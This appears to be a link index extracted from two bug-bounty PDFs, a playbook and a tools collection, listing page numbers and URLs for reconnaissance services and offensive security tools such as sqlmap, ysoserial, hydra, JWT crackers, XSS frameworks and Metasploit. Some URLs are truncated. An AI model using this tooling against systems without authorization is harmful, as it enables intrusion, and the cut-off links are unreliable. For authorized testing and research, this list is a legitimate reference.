Bug Bounty Playbook v1.pdf,26,https://github.com/ehrishirajsharma/SwiftnessX
Bug Bounty Playbook v1.pdf,26,https://evernote.com/
Bug Bounty Playbook v1.pdf,26,https://www.sublimetext.com/
Bug Bounty Playbook v1.pdf,26,https://notepad-plus-plus.org/
Bug Bounty Playbook v1.pdf,27,https://portswigger.net/burp
Bug Bounty Playbook v1.pdf,30,https://nvd.nist.gov/vuln/search
Bug Bounty Playbook v1.pdf,30,https://twitter.com/cvenew?lang=en
Bug Bounty Playbook v1.pdf,32,https://www.inoreader.com
Bug Bounty Playbook v1.pdf,33,http://rss.ricterz.me/hacktivity
Bug Bounty Playbook v1.pdf,33,https://medium.com/feed/tag/hac
Bug Bounty Playbook v1.pdf,33,https://nvd.nist.gov/feeds/xm
Bug Bounty Playbook v1.pdf,33,https://nvd.nist.gov/feeds/xm
Bug Bounty Playbook v1.pdf,33,https://medium.com/feed/bu
Bug Bounty Playbook v1.pdf,33,http://blog.portswigger.net/fe
Bug Bounty Playbook v1.pdf,34,http://www.reddit.com/r/net
Bug Bounty Playbook v1.pdf,34,http://threatpost.com/feed/
Bug Bounty Playbook v1.pdf,35,https://www.reddit.com/r/netsec/
Bug Bounty Playbook v1.pdf,67,https://mxtoolbox.com/asn.aspx
Bug Bounty Playbook v1.pdf,69,https://viewdns.info/reversewhois
Bug Bounty Playbook v1.pdf,72,https://domaineye.com/
Bug Bounty Playbook v1.pdf,73,https://domaineye.com/
Bug Bounty Playbook v1.pdf,73,https://domaineye.com/
Bug Bounty Playbook v1.pdf,75,https://github.com/OWASP/Amass
Bug Bounty Playbook v1.pdf,76,https://github.com/OWASP/Amass/blob/master/doc/install.md
Bug Bounty Playbook v1.pdf,80,https://github.com/danielmiessler/SecLists
Bug Bounty Playbook v1.pdf,81,https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-
Bug Bounty Playbook v1.pdf,81,https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-
Bug Bounty Playbook v1.pdf,81,https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-
Bug Bounty Playbook v1.pdf,83,https://github.com/assetnote/commonspeak2
Bug Bounty Playbook v1.pdf,83,https://github.com/assetnote/commonspeak2-wordlists
Bug Bounty Playbook v1.pdf,84,https://gist.github.com/jhaddix/86a06c5dc309d08580a018c66354a056
Bug Bounty Playbook v1.pdf,84,https://github.com/internetwache/CT_subdomains
Bug Bounty Playbook v1.pdf,86,https://crt.sh/?q=%25.facebook.com
Bug Bounty Playbook v1.pdf,88,https://github.com/ghostlulzhacks/CertificateTransparencyLogs
Bug Bounty Playbook v1.pdf,90,https://opendata.rapid7.com/sonar.fdns_v2/
Bug Bounty Playbook v1.pdf,90,https://opendata.rapid7.com/sonar.fdns/
Bug Bounty Playbook v1.pdf,91,https://github.com/gwen001/github-search/blob/master/github-
Bug Bounty Playbook v1.pdf,92,https://github.com/OJ/gobuster
Bug Bounty Playbook v1.pdf,94,https://github.com/infosec-au/altdns
Bug Bounty Playbook v1.pdf,96,https://github.com/OWASP/Amass
Bug Bounty Playbook v1.pdf,96,https://github.com/guelfoweb/knock
Bug Bounty Playbook v1.pdf,98,https://github.com/blechschmidt/massdns
Bug Bounty Playbook v1.pdf,98,https://github.com/blechschmidt/massdns.git
Bug Bounty Playbook v1.pdf,98,https://github.com/stedolan/jq
Bug Bounty Playbook v1.pdf,99,https://github.com/FortyNorthSecurity/EyeWitness
Bug Bounty Playbook v1.pdf,101,https://github.com/ghostlulzhacks/crawler/tree/master
Bug Bounty Playbook v1.pdf,102,https://web.archive.org/
Bug Bounty Playbook v1.pdf,103,https://web.archive.org/web/*/facebook.com/*”
Bug Bounty Playbook v1.pdf,104,https://github.com/ghostlulzhacks/waybackMachine
Bug Bounty Playbook v1.pdf,104,http://commoncrawl.org/
Bug Bounty Playbook v1.pdf,104,https://github.com/ghostlulzhacks/commoncrawl
Bug Bounty Playbook v1.pdf,105,https://github.com/OJ/gobuster
Bug Bounty Playbook v1.pdf,107,https://github.com/GerbenJavado/LinkFinder
Bug Bounty Playbook v1.pdf,108,https://github.com/incogbyte/jsearch
Bug Bounty Playbook v1.pdf,108,https://github.com/incogbyte/jsearch/blob/master/regex_modules/regex_m
Bug Bounty Playbook v1.pdf,109,https://starbucks.com
Bug Bounty Playbook v1.pdf,110,https://www.exploit-db.com/google-hacking-database
Bug Bounty Playbook v1.pdf,111,https://gbhackers.com/latest-google-dorks-list/
Bug Bounty Playbook v1.pdf,118,https://www.shodan.io/
Bug Bounty Playbook v1.pdf,122,https://censys.io/ipv4
Bug Bounty Playbook v1.pdf,123,https://github.com/robertdavidgraham/masscan
Bug Bounty Playbook v1.pdf,124,https://github.com/offensive-security/masscan-web-ui
Bug Bounty Playbook v1.pdf,126,https://github.com/vincd/wappylyzer
Bug Bounty Playbook v1.pdf,127,https://github.com/EnableSecurity/wafw00f
Bug Bounty Playbook v1.pdf,128,https://github.com/0xInfection/Awesome-WAF#known-bypasses
Bug Bounty Playbook v1.pdf,133,https://github.com/haccer/subjack
Bug Bounty Playbook v1.pdf,135,https://github.com/EdOverflow/can-i-take-over-xyz
Bug Bounty Playbook v1.pdf,138,https://github.com/techgaun/github-dorks/blob/master/github-dorks.txt
Bug Bounty Playbook v1.pdf,143,https://github.com/ghostlulzhacks/s3brute
Bug Bounty Playbook v1.pdf,145,https://github.com/RhinoSecurityLabs/GCPBucketBrute
Bug Bounty Playbook v1.pdf,146,https://github.com/appsecco/spaces-finder
Bug Bounty Playbook v1.pdf,161,https://example.com/.git”
Bug Bounty Playbook v1.pdf,162,https://github.com/internetwache/GitTools/tree/master/Dumper
Bug Bounty Playbook v1.pdf,162,https://example.com/.git/
Bug Bounty Playbook v1.pdf,163,https://example.com/.svn”
Bug Bounty Playbook v1.pdf,164,https://github.com/anantshri/svn-extractor
Bug Bounty Playbook v1.pdf,167,https://github.com/wpscanteam/wpscan
Bug Bounty Playbook v1.pdf,168,https://github.com/rezasp/joomscan
Bug Bounty Playbook v1.pdf,169,https://github.com/droope/droopescan
Bug Bounty Playbook v1.pdf,170,https://github.com/0ang3el/aem-hacker
Bug Bounty Playbook v1.pdf,171,https://www.exploit-db.com/
Bug Bounty Playbook v1.pdf,173,https://github.com/steverobbins/magescan
Bug Bounty Playbook v1.pdf,174,https://portswigger.net/burp
Bug Bounty Playbook v1.pdf,176,"http://example.com"""
Bug Bounty Playbook v1.pdf,178,https://portswigger.net/web-security
Bug Bounty Playbook v1.pdf,184,"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"""
Bug Bounty Playbook v1.pdf,184,"http://www.w3.org/2000/svg"""
Bug Bounty Playbook v1.pdf,184,https://XXXXXXXXX
Bug Bounty Playbook v1.pdf,184,"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"""
Bug Bounty Playbook v1.pdf,184,"http://www.w3.org/2000/svg"""
Bug Bounty Playbook v1.pdf,191,https://acc71f681f28327e80e13486006a005a.web-security-
Bug Bounty Playbook v1.pdf,192,https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%2
Bug Bounty Playbook v1.pdf,199,https://github.com/sqlmapproject/sqlmap
Bug Bounty Playbook v1.pdf,208,http://websocket.org/echo.html
Bug Bounty Tools Collection.pdf,2,https://github.com/aboul3la/Sublist3r
Bug Bounty Tools Collection.pdf,2,https://github.com/OWASP/Amass
Bug Bounty Tools Collection.pdf,2,https://github.com/blechschmidt/massdns
Bug Bounty Tools Collection.pdf,2,https://github.com/Findomain/Findomain
Bug Bounty Tools Collection.pdf,2,https://github.com/Screetsec/Sudomy
Bug Bounty Tools Collection.pdf,2,https://github.com/projectdiscovery/chaos-client
Bug Bounty Tools Collection.pdf,2,https://github.com/TypeError/domained
Bug Bounty Tools Collection.pdf,2,https://github.com/appsecco/bugcrowd-levelup-subdomain-
Bug Bounty Tools Collection.pdf,2,https://github.com/projectdiscovery/shuffledns
Bug Bounty Tools Collection.pdf,2,https://github.com/christophetd/censys-subdomain-finder
Bug Bounty Tools Collection.pdf,2,https://github.com/fleetcaptain/Turbolist3r
Bug Bounty Tools Collection.pdf,2,https://github.com/0xbharath/censys-enumeration
Bug Bounty Tools Collection.pdf,3,https://github.com/LordNeoStark/tugarecon
Bug Bounty Tools Collection.pdf,3,https://github.com/cinerieus/as3nt
Bug Bounty Tools Collection.pdf,3,https://github.com/si9int/Subra
Bug Bounty Tools Collection.pdf,3,https://github.com/nexxai/Substr3am
Bug Bounty Tools Collection.pdf,3,https://github.com/jhaddix/domain/
Bug Bounty Tools Collection.pdf,3,https://github.com/infosec-au/altdns
Bug Bounty Tools Collection.pdf,3,https://github.com/anshumanbh/brutesubs
Bug Bounty Tools Collection.pdf,3,https://github.com/lorenzog/dns-parallel-prober
Bug Bounty Tools Collection.pdf,3,https://github.com/rbsec/dnscan
Bug Bounty Tools Collection.pdf,3,https://github.com/guelfoweb/knock
Bug Bounty Tools Collection.pdf,3,https://github.com/hakluke/hakrevdns
Bug Bounty Tools Collection.pdf,3,https://github.com/projectdiscovery/dnsx
Bug Bounty Tools Collection.pdf,3,https://github.com/projectdiscovery/subfinder
Bug Bounty Tools Collection.pdf,3,https://github.com/tomnomnom/assetfinder
Bug Bounty Tools Collection.pdf,3,https://github.com/nahamsec/crtndstry
Bug Bounty Tools Collection.pdf,3,https://github.com/codingo/VHostScan
Bug Bounty Tools Collection.pdf,3,https://github.com/edoardottt/scilla
Bug Bounty Tools Collection.pdf,3,https://github.com/3nock/sub3suite
Bug Bounty Tools Collection.pdf,3,https://github.com/robertdavidgraham/masscan
Bug Bounty Tools Collection.pdf,3,https://github.com/RustScan/RustScan
Bug Bounty Tools Collection.pdf,3,https://github.com/projectdiscovery/naabu
Bug Bounty Tools Collection.pdf,3,https://github.com/nmap/nmap
Bug Bounty Tools Collection.pdf,3,https://github.com/trimstray/sandmap
Bug Bounty Tools Collection.pdf,3,https://github.com/johnnyxmas/ScanCannon
Bug Bounty Tools Collection.pdf,4,https://github.com/FortyNorthSecurity/EyeWitness
Bug Bounty Tools Collection.pdf,4,https://github.com/michenriksen/aquatone
Bug Bounty Tools Collection.pdf,4,https://github.com/vladocar/screenshoteer
Bug Bounty Tools Collection.pdf,4,https://github.com/sensepost/gowitness
Bug Bounty Tools Collection.pdf,4,https://github.com/byt3bl33d3r/WitnessMe
Bug Bounty Tools Collection.pdf,4,https://github.com/BishopFox/eyeballer
Bug Bounty Tools Collection.pdf,4,https://github.com/nccgroup/scrying
Bug Bounty Tools Collection.pdf,4,https://github.com/beurtschipper/Depix
Bug Bounty Tools Collection.pdf,4,https://github.com/breenmachine/httpscreenshot/
Bug Bounty Tools Collection.pdf,4,https://github.com/AliasIO/wappalyzer
Bug Bounty Tools Collection.pdf,4,https://github.com/rverton/webanalyze
Bug Bounty Tools Collection.pdf,4,https://github.com/claymation/python-builtwith
Bug Bounty Tools Collection.pdf,4,https://github.com/urbanadventurer/whatweb
Bug Bounty Tools Collection.pdf,4,https://github.com/RetireJS/retire.js
Bug Bounty Tools Collection.pdf,4,https://github.com/projectdiscovery/httpx
Bug Bounty Tools Collection.pdf,4,https://github.com/praetorian-inc/fingerprintx
Bug Bounty Tools Collection.pdf,4,https://github.com/OJ/gobuster
Bug Bounty Tools Collection.pdf,4,https://github.com/C-Sto/recursebuster
Bug Bounty Tools Collection.pdf,4,https://github.com/epi052/feroxbuster
Bug Bounty Tools Collection.pdf,4,https://github.com/maurosoria/dirsearch
Bug Bounty Tools Collection.pdf,4,https://github.com/evilsocket/dirsearch
Bug Bounty Tools Collection.pdf,4,https://github.com/henshin/filebuster
Bug Bounty Tools Collection.pdf,5,https://github.com/stefanoj3/dirstalk
Bug Bounty Tools Collection.pdf,5,https://github.com/digination/dirbuster-ng
Bug Bounty Tools Collection.pdf,5,https://github.com/jaeles-project/gospider
Bug Bounty Tools Collection.pdf,5,https://github.com/hakluke/hakrawler
Bug Bounty Tools Collection.pdf,5,https://github.com/s0rg/crawley
Bug Bounty Tools Collection.pdf,5,https://github.com/GerbenJavado/LinkFinder
Bug Bounty Tools Collection.pdf,5,https://github.com/zseano/JS-Scan
Bug Bounty Tools Collection.pdf,5,https://github.com/arbazkiraak/LinksDumper
Bug Bounty Tools Collection.pdf,5,https://github.com/0xsha/GoLinkFinder
Bug Bounty Tools Collection.pdf,5,https://github.com/InitRoot/BurpJSLinkFinder
Bug Bounty Tools Collection.pdf,5,https://github.com/IAmStoxe/urlgrab
Bug Bounty Tools Collection.pdf,5,https://github.com/tomnomnom/waybackurls
Bug Bounty Tools Collection.pdf,5,https://github.com/lc/gau
Bug Bounty Tools Collection.pdf,5,https://github.com/003random/getJS
Bug Bounty Tools Collection.pdf,5,https://github.com/riza/linx
Bug Bounty Tools Collection.pdf,5,https://github.com/maK-/parameth
Bug Bounty Tools Collection.pdf,5,https://github.com/PortSwigger/param-miner
Bug Bounty Tools Collection.pdf,5,https://github.com/Bo0oM/ParamPamPam
Bug Bounty Tools Collection.pdf,5,https://github.com/s0md3v/Arjun
Bug Bounty Tools Collection.pdf,5,https://github.com/devanshbatham/ParamSpider
Bug Bounty Tools Collection.pdf,5,https://github.com/Sh1Yo/x8
Bug Bounty Tools Collection.pdf,5,https://github.com/xmendez/wfuzz
Bug Bounty Tools Collection.pdf,5,https://github.com/ffuf/ffuf
Bug Bounty Tools Collection.pdf,6,https://github.com/fuzzdb-project/fuzzdb
Bug Bounty Tools Collection.pdf,6,https://github.com/1N3/IntruderPayloads
Bug Bounty Tools Collection.pdf,6,https://github.com/Bo0oM/fuzz.txt
Bug Bounty Tools Collection.pdf,6,https://github.com/googleprojectzero/fuzzilli
Bug Bounty Tools Collection.pdf,6,https://github.com/Fuzzapi/fuzzapi
Bug Bounty Tools Collection.pdf,6,https://github.com/ameenmaali/qsfuzz
Bug Bounty Tools Collection.pdf,6,https://github.com/d4rckh/vaf
Bug Bounty Tools Collection.pdf,6,https://github.com/commixproject/commix
Bug Bounty Tools Collection.pdf,6,https://github.com/s0md3v/Corsy
Bug Bounty Tools Collection.pdf,6,https://github.com/RUB-NDS/CORStest
Bug Bounty Tools Collection.pdf,6,https://github.com/laconicwolf/cors-scanner
Bug Bounty Tools Collection.pdf,6,https://github.com/Shivangx01b/CorsMe
Bug Bounty Tools Collection.pdf,6,https://github.com/Nefcore/CRLFsuite
Bug Bounty Tools Collection.pdf,6,https://github.com/dwisiswant0/crlfuzz
Bug Bounty Tools Collection.pdf,6,https://github.com/MichaelStott/CRLF-Injection-Scanner
Bug Bounty Tools Collection.pdf,6,https://github.com/BountyStrike/Injectus
Bug Bounty Tools Collection.pdf,6,https://github.com/0xInfection/XSRFProbe
Bug Bounty Tools Collection.pdf,7,https://github.com/wireghoul/dotdotpwn
Bug Bounty Tools Collection.pdf,7,https://github.com/chrispetrou/FDsploit
Bug Bounty Tools Collection.pdf,7,https://github.com/bayotop/off-by-slash
Bug Bounty Tools Collection.pdf,7,https://github.com/momenbasel/liffier
Bug Bounty Tools Collection.pdf,7,https://github.com/mzfr/liffy
Bug Bounty Tools Collection.pdf,7,https://github.com/Team-Firebugs/Burp-LFI-tests
Bug Bounty Tools Collection.pdf,7,https://github.com/mthbernardes/LFI-Enum
Bug Bounty Tools Collection.pdf,7,https://github.com/D35m0nd142/LFISuite
Bug Bounty Tools Collection.pdf,7,https://github.com/hussein98d/LFI-files
Bug Bounty Tools Collection.pdf,7,https://github.com/doyensec/inql
Bug Bounty Tools Collection.pdf,7,https://github.com/swisskyrepo/GraphQLmap
Bug Bounty Tools Collection.pdf,7,https://github.com/szski/shapeshifter
Bug Bounty Tools Collection.pdf,7,https://github.com/zidekmat/graphql_beautifier
Bug Bounty Tools Collection.pdf,7,https://github.com/nikitastupin/clairvoyance
Bug Bounty Tools Collection.pdf,7,https://github.com/mlcsec/headi
Bug Bounty Tools Collection.pdf,7,https://github.com/frohoff/ysoserial
Bug Bounty Tools Collection.pdf,7,https://github.com/BishopFox/GadgetProbe
Bug Bounty Tools Collection.pdf,7,https://github.com/pwntester/ysoserial.net
Bug Bounty Tools Collection.pdf,7,https://github.com/ambionics/phpggc
Bug Bounty Tools Collection.pdf,8,https://github.com/Quitten/Autorize
Bug Bounty Tools Collection.pdf,8,https://github.com/r0075h3ll/Oralyzer
Bug Bounty Tools Collection.pdf,8,https://github.com/BountyStrike/Injectus
Bug Bounty Tools Collection.pdf,8,https://github.com/Naategh/dom-red
Bug Bounty Tools Collection.pdf,8,https://github.com/devanshbatham/OpenRedireX
Bug Bounty Tools Collection.pdf,8,https://github.com/compsec-snu/razzer
Bug Bounty Tools Collection.pdf,8,https://github.com/racepwn/racepwn
Bug Bounty Tools Collection.pdf,8,https://github.com/nccgroup/requests-racer
Bug Bounty Tools Collection.pdf,8,https://github.com/PortSwigger/turbo-intruder
Bug Bounty Tools Collection.pdf,8,https://github.com/TheHackerDev/race-the-web
Bug Bounty Tools Collection.pdf,8,https://github.com/anshumanpattnaik/http-request-smuggling
Bug Bounty Tools Collection.pdf,8,https://github.com/defparam/smuggler
Bug Bounty Tools Collection.pdf,8,https://github.com/BishopFox/h2csmuggler
Bug Bounty Tools Collection.pdf,8,https://github.com/defparam/tiscripts
Bug Bounty Tools Collection.pdf,8,https://github.com/swisskyrepo/SSRFmap
Bug Bounty Tools Collection.pdf,8,https://github.com/tarunkant/Gopherus
Bug Bounty Tools Collection.pdf,8,https://github.com/jobertabma/ground-control
Bug Bounty Tools Collection.pdf,8,https://github.com/micha3lb3n/SSRFire
Bug Bounty Tools Collection.pdf,8,https://github.com/daeken/httprebind
Bug Bounty Tools Collection.pdf,8,https://github.com/teknogeek/ssrf-sheriff
Bug Bounty Tools Collection.pdf,9,https://github.com/SpiderMate/B-XSSRF
Bug Bounty Tools Collection.pdf,9,https://github.com/Damian89/extended-ssrf-search
Bug Bounty Tools Collection.pdf,9,https://github.com/KathanP19/gaussrf
Bug Bounty Tools Collection.pdf,9,https://github.com/JacobReynolds/ssrfDetector
Bug Bounty Tools Collection.pdf,9,https://github.com/RandomRobbieBF/grafana-ssrf
Bug Bounty Tools Collection.pdf,9,https://github.com/xawdxawdx/sentrySSRF
Bug Bounty Tools Collection.pdf,9,https://github.com/knassar702/lorsrf
Bug Bounty Tools Collection.pdf,9,https://github.com/nccgroup/singularity
Bug Bounty Tools Collection.pdf,9,https://github.com/brannondorsey/whonow
Bug Bounty Tools Collection.pdf,9,https://github.com/brannondorsey/dns-rebind-toolkit
Bug Bounty Tools Collection.pdf,9,https://github.com/FSecureLABS/dref
Bug Bounty Tools Collection.pdf,9,https://github.com/taviso/rbndr
Bug Bounty Tools Collection.pdf,9,https://github.com/daeken/httprebind
Bug Bounty Tools Collection.pdf,9,https://github.com/makuga01/dnsFookup
Bug Bounty Tools Collection.pdf,9,https://github.com/sqlmapproject/sqlmap
Bug Bounty Tools Collection.pdf,9,https://github.com/codingo/NoSQLMap
Bug Bounty Tools Collection.pdf,9,https://github.com/0xbug/SQLiScanner
Bug Bounty Tools Collection.pdf,9,https://github.com/RhinoSecurityLabs/SleuthQL
Bug Bounty Tools Collection.pdf,9,https://github.com/blackarrowsec/mssqlproxy
Bug Bounty Tools Collection.pdf,9,https://github.com/zt2/sqli-hunter
Bug Bounty Tools Collection.pdf,9,https://github.com/ghostlulzhacks/waybackSqliScanner
Bug Bounty Tools Collection.pdf,9,https://github.com/NetSPI/ESC
Bug Bounty Tools Collection.pdf,9,https://github.com/Keramas/mssqli-duet
Bug Bounty Tools Collection.pdf,9,https://github.com/Miladkhoshdel/burp-to-sqlmap
Bug Bounty Tools Collection.pdf,9,https://github.com/InitRoot/BurpSQLTruncSanner
Bug Bounty Tools Collection.pdf,10,https://github.com/sadicann/andor
Bug Bounty Tools Collection.pdf,10,https://github.com/mhaskar/Blinder
Bug Bounty Tools Collection.pdf,10,https://github.com/the-robot/sqliv
Bug Bounty Tools Collection.pdf,10,https://github.com/Charlie-belmer/nosqli
Bug Bounty Tools Collection.pdf,10,https://github.com/s0md3v/XSStrike
Bug Bounty Tools Collection.pdf,10,https://github.com/evilcos/xssor2
Bug Bounty Tools Collection.pdf,10,https://github.com/DanMcInerney/xsscrapy
Bug Bounty Tools Collection.pdf,10,https://github.com/Netflix-Skunkworks/sleepy-puppy
Bug Bounty Tools Collection.pdf,10,https://github.com/ssl/ezXSS
Bug Bounty Tools Collection.pdf,10,https://github.com/mandatoryprogrammer/xsshunter
Bug Bounty Tools Collection.pdf,10,https://github.com/hahwul/dalfox
Bug Bounty Tools Collection.pdf,10,https://github.com/epsylon/xsser
Bug Bounty Tools Collection.pdf,10,https://github.com/hahwul/XSpear
Bug Bounty Tools Collection.pdf,10,https://github.com/hakluke/weaponised-XSS-payloads
Bug Bounty Tools Collection.pdf,10,https://github.com/nccgroup/tracy
Bug Bounty Tools Collection.pdf,10,https://github.com/jobertabma/ground-control
Bug Bounty Tools Collection.pdf,10,https://github.com/nVisium/xssValidator
Bug Bounty Tools Collection.pdf,10,https://github.com/Den1al/JSShell
Bug Bounty Tools Collection.pdf,10,https://github.com/LewisArdern/bXSS
Bug Bounty Tools Collection.pdf,10,https://github.com/whitel1st/docem
Bug Bounty Tools Collection.pdf,10,https://github.com/bugbountyforum/XSS-Radar
Bug Bounty Tools Collection.pdf,10,https://github.com/rajeshmajumdar/BruteXSS
Bug Bounty Tools Collection.pdf,10,https://github.com/dwisiswant0/findom-xss
Bug Bounty Tools Collection.pdf,10,https://github.com/fcavallarin/domdig
Bug Bounty Tools Collection.pdf,10,https://github.com/wish-i-was/femida
Bug Bounty Tools Collection.pdf,11,https://github.com/SpiderMate/B-XSSRF
Bug Bounty Tools Collection.pdf,11,https://github.com/yaph/domxssscanner
Bug Bounty Tools Collection.pdf,11,https://github.com/mandatoryprogrammer/xsshunter_client
Bug Bounty Tools Collection.pdf,11,https://github.com/Damian89/extended-xss-search
Bug Bounty Tools Collection.pdf,11,https://github.com/Jewel591/xssmap
Bug Bounty Tools Collection.pdf,11,https://github.com/menkrep1337/XSSCon
Bug Bounty Tools Collection.pdf,11,https://github.com/BitTheByte/BitBlinder
Bug Bounty Tools Collection.pdf,11,https://github.com/dxa4481/XSSOauthPersistence
Bug Bounty Tools Collection.pdf,11,https://github.com/shadow-workers/shadow-workers
Bug Bounty Tools Collection.pdf,11,https://github.com/profmoriarity/rexsser
Bug Bounty Tools Collection.pdf,11,https://github.com/EgeBalci/xss-flare
Bug Bounty Tools Collection.pdf,11,https://github.com/jiangsir404/Xss-Sql-Fuzz
Bug Bounty Tools Collection.pdf,11,https://github.com/hipotermia/vaya-ciego-nen
Bug Bounty Tools Collection.pdf,11,https://github.com/AsaiKen/dom-based-xss-finder
Bug Bounty Tools Collection.pdf,11,https://github.com/machinexa2/XSSTerminal
Bug Bounty Tools Collection.pdf,11,https://github.com/vavkamil/xss2png
Bug Bounty Tools Collection.pdf,11,https://github.com/vavkamil/XSSwagger
Bug Bounty Tools Collection.pdf,11,https://github.com/jobertabma/ground-control
Bug Bounty Tools Collection.pdf,11,https://github.com/GoSecure/dtd-finder
Bug Bounty Tools Collection.pdf,11,https://github.com/whitel1st/docem
Bug Bounty Tools Collection.pdf,11,https://github.com/staaldraad/xxeserv
Bug Bounty Tools Collection.pdf,11,https://github.com/luisfontes19/xxexploiter
Bug Bounty Tools Collection.pdf,11,https://github.com/SpiderMate/B-XSSRF
Bug Bounty Tools Collection.pdf,12,https://github.com/enjoiz/XXEinjector
Bug Bounty Tools Collection.pdf,12,https://github.com/BuffaloWill/oxml_xxe
Bug Bounty Tools Collection.pdf,12,https://github.com/vp777/metahttp
Bug Bounty Tools Collection.pdf,12,https://github.com/vanhauser-thc/thc-hydra
Bug Bounty Tools Collection.pdf,12,https://github.com/ihebski/DefaultCreds-cheat-sheet
Bug Bounty Tools Collection.pdf,12,https://github.com/ztgrace/changeme
Bug Bounty Tools Collection.pdf,12,https://github.com/1N3/BruteX
Bug Bounty Tools Collection.pdf,12,https://github.com/lanjelot/patator
Bug Bounty Tools Collection.pdf,12,https://github.com/awslabs/git-secrets
Bug Bounty Tools Collection.pdf,12,https://github.com/zricethezav/gitleaks
Bug Bounty Tools Collection.pdf,12,https://github.com/dxa4481/truffleHog
Bug Bounty Tools Collection.pdf,12,https://github.com/hisxo/gitGraber
Bug Bounty Tools Collection.pdf,12,https://github.com/thoughtworks/talisman
Bug Bounty Tools Collection.pdf,12,https://github.com/BishopFox/GitGot
Bug Bounty Tools Collection.pdf,12,https://github.com/anshumanbh/git-all-secrets
Bug Bounty Tools Collection.pdf,12,https://github.com/gwen001/github-search
Bug Bounty Tools Collection.pdf,12,https://github.com/cve-search/git-vuln-finder
Bug Bounty Tools Collection.pdf,12,https://github.com/x1sec/commit-stream
Bug Bounty Tools Collection.pdf,13,https://github.com/michenriksen/gitrob
Bug Bounty Tools Collection.pdf,13,https://github.com/auth0/repo-supervisor
Bug Bounty Tools Collection.pdf,13,https://github.com/UnkL4b/GitMiner
Bug Bounty Tools Collection.pdf,13,https://github.com/eth0izzle/shhgit
Bug Bounty Tools Collection.pdf,13,https://github.com/Yelp/detect-secrets
Bug Bounty Tools Collection.pdf,13,https://github.com/newrelic/rusty-hog
Bug Bounty Tools Collection.pdf,13,https://github.com/Skyscanner/whispers
Bug Bounty Tools Collection.pdf,13,https://github.com/nielsing/yar
Bug Bounty Tools Collection.pdf,13,https://github.com/BishopFox/dufflebag
Bug Bounty Tools Collection.pdf,13,https://github.com/duo-labs/secret-bridge
Bug Bounty Tools Collection.pdf,13,https://github.com/americanexpress/earlybird
Bug Bounty Tools Collection.pdf,13,https://github.com/trufflesecurity/Trufflehog-Chrome-Extension
Bug Bounty Tools Collection.pdf,13,https://github.com/internetwache/GitTools
Bug Bounty Tools Collection.pdf,13,https://github.com/liamg/gitjacker
Bug Bounty Tools Collection.pdf,13,https://github.com/arthaud/git-dumper
Bug Bounty Tools Collection.pdf,13,https://github.com/digininja/GitHunter
Bug Bounty Tools Collection.pdf,13,https://github.com/kost/dvcs-ripper
Bug Bounty Tools Collection.pdf,13,https://github.com/sa7mon/S3Scanner
Bug Bounty Tools Collection.pdf,13,https://github.com/jordanpotti/AWSBucketDump
Bug Bounty Tools Collection.pdf,13,https://github.com/jordanpotti/CloudScraper
Bug Bounty Tools Collection.pdf,13,https://github.com/SharonBrizinov/s3viewer
Bug Bounty Tools Collection.pdf,13,https://github.com/cr0hn/festin
Bug Bounty Tools Collection.pdf,13,https://github.com/hahwul/s3reverse
Bug Bounty Tools Collection.pdf,13,https://github.com/random-robbie/mass-s3-bucket-tester
Bug Bounty Tools Collection.pdf,13,https://github.com/AlecBlance/S3BucketList
Bug Bounty Tools Collection.pdf,14,https://github.com/cybercdh/dirlstr
Bug Bounty Tools Collection.pdf,14,https://github.com/codewatchorg/Burp-AnonymousCloud
Bug Bounty Tools Collection.pdf,14,https://github.com/abuvanth/kicks3
Bug Bounty Tools Collection.pdf,14,https://github.com/Revenant40/2tearsinabucket
Bug Bounty Tools Collection.pdf,14,https://github.com/nccgroup/s3_objects_check
Bug Bounty Tools Collection.pdf,14,https://github.com/ankane/s3tk
Bug Bounty Tools Collection.pdf,14,https://github.com/0xsha/CloudBrute
Bug Bounty Tools Collection.pdf,14,https://github.com/0xspade/s3cario
Bug Bounty Tools Collection.pdf,14,https://github.com/JR0ch17/S3Cruze
Bug Bounty Tools Collection.pdf,14,https://github.com/wpscanteam/wpscan
Bug Bounty Tools Collection.pdf,14,https://github.com/cyc10n3/WPSpider
Bug Bounty Tools Collection.pdf,14,https://github.com/blackcrw/wprecon
Bug Bounty Tools Collection.pdf,14,https://github.com/Dionach/CMSmap
Bug Bounty Tools Collection.pdf,14,https://github.com/OWASP/joomscan
Bug Bounty Tools Collection.pdf,14,https://github.com/fgeek/pyfiscan
Bug Bounty Tools Collection.pdf,14,https://github.com/ticarpi/jwt_tool
Bug Bounty Tools Collection.pdf,14,https://github.com/brendan-rius/c-jwt-cracker
Bug Bounty Tools Collection.pdf,14,https://github.com/wallarm/jwt-heartbreaker
Bug Bounty Tools Collection.pdf,14,https://github.com/KINGSABRI/jwtear
Bug Bounty Tools Collection.pdf,14,https://github.com/dariusztytko/jwt-key-id-injector
Bug Bounty Tools Collection.pdf,14,https://github.com/hahwul/jwt-hack
Bug Bounty Tools Collection.pdf,14,https://github.com/lmammino/jwt-cracker
Bug Bounty Tools Collection.pdf,14,https://github.com/fransr/postMessage-tracker
Bug Bounty Tools Collection.pdf,15,https://github.com/kiranreddyrebel/PostMessage_Fuzz_Tool
Bug Bounty Tools Collection.pdf,15,https://github.com/haccer/subjack
Bug Bounty Tools Collection.pdf,15,https://github.com/Ice3man543/SubOver
Bug Bounty Tools Collection.pdf,15,https://github.com/JordyZomer/autoSubTakeover
Bug Bounty Tools Collection.pdf,15,https://github.com/shivsahni/NSBrute
Bug Bounty Tools Collection.pdf,15,https://github.com/EdOverflow/can-i-take-over-xyz
Bug Bounty Tools Collection.pdf,15,https://github.com/cybercdh/cnames
Bug Bounty Tools Collection.pdf,15,https://github.com/vavkamil/old-repos-backup/tree/master/subHijack-master
Bug Bounty Tools Collection.pdf,15,https://github.com/anshumanbh/tko-subs
Bug Bounty Tools Collection.pdf,15,https://github.com/nahamsec/HostileSubBruteforcer
Bug Bounty Tools Collection.pdf,15,https://github.com/mhmdiaa/second-order
Bug Bounty Tools Collection.pdf,15,https://github.com/mzfr/takeover
Bug Bounty Tools Collection.pdf,15,https://github.com/punk-security/dnsReaper
Bug Bounty Tools Collection.pdf,15,https://github.com/projectdiscovery/nuclei
Bug Bounty Tools Collection.pdf,15,https://github.com/1N3/Sn1per
Bug Bounty Tools Collection.pdf,15,https://github.com/rapid7/metasploit-framework
